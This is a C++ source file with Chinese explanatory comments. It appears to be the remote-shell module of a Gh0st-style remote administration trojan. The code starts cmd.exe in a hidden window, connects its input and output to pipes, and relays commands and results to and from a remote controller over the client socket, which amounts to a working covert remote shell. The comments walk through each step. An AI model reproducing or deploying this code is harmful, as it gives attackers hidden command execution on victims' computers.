// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ShellManager.h"
#include "Common.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)   //该成员走父类的构造函数
{

	SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};
	
    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

	
	
	//创建双管道 
    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)
		{
			CloseHandle(m_hReadPipeHandle);
		}
		if(m_hWritePipeShell != NULL)
		{
			CloseHandle(m_hWritePipeShell);
		}
		return;
    }
	
    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)
		{
			CloseHandle(m_hWritePipeHandle);
		}
		if(m_hReadPipeShell != NULL)
		{
			CloseHandle(m_hReadPipeShell);
		}
		return;
    }
	
	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));
	
	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;                           //将管道赋值
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 
	
	GetSystemDirectory(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");
    //创建cmd进出  并指定管道
	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;    //保存Cmd进程的进程句柄和主线程句柄
	m_hThreadHandle	= pi.hThread;


	//通知主控端 一切准备就绪
	BYTE	bToken = TOKEN_SHELL_START;      //包含头文件 Common.h     
	Send((LPBYTE)&bToken, 1);                //该类是继承Manager类的 所以调用的是父类的Send函数向我们的主控制端发送我们准备好了消息并等待响应
	WaitForDialogOpen();

	//然后创建一个读取管道数据的 线程    一会查看ReadPipeThread
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	//再创建一个等待的线程  等待管道关闭 也就是用户关闭终端管理
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{

	TerminateThread(m_hThreadRead, 0);       //结束我们自己创建的线程
	TerminateProcess(m_hProcessHandle, 0);   //结束我们自己创建的Cmd进程
	TerminateThread(m_hThreadHandle, 0);     //结束我们自己创建的Cmd线程
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);


	
	if (m_hReadPipeHandle != NULL)
	{
		DisconnectNamedPipe(m_hReadPipeHandle);
	}
	if (m_hWritePipeHandle != NULL)
	{
		DisconnectNamedPipe(m_hWritePipeHandle);
	}
	if (m_hReadPipeShell != NULL)
	{
		DisconnectNamedPipe(m_hReadPipeShell);
	}
	if (m_hWritePipeShell != NULL)
	{
		DisconnectNamedPipe(m_hWritePipeShell);
	}
	
    CloseHandle(m_hReadPipeHandle);
    CloseHandle(m_hWritePipeHandle);
    CloseHandle(m_hReadPipeShell);
    CloseHandle(m_hWritePipeShell);
	
    CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
    CloseHandle(m_hThreadRead);


}


DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		Sleep(100);
		//这里检测是否有数据  数据的大小是多少
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			//如果没有数据就跳出本本次循环
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			//读取管道数据
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// 发送数据
			pThis->Send(lpBuffer, BytesRead);   //到主控制端
			LocalFree(lpBuffer);
			
		}
	}
	return 0;
}
DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();            //关闭这个与主控制端远程终端建立链接的Socket
	return 0;
}



void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)   //该函数是是个虚函数 //先进入OnRead函数
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)      //判断是否为通知主控端对话框打开
	{
		NotifyDialogIsOpen();
		return;
	}
	
	//将客户端发送来的数据写入到cmd的输入管道中             
	unsigned long	ByteWrite;
	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}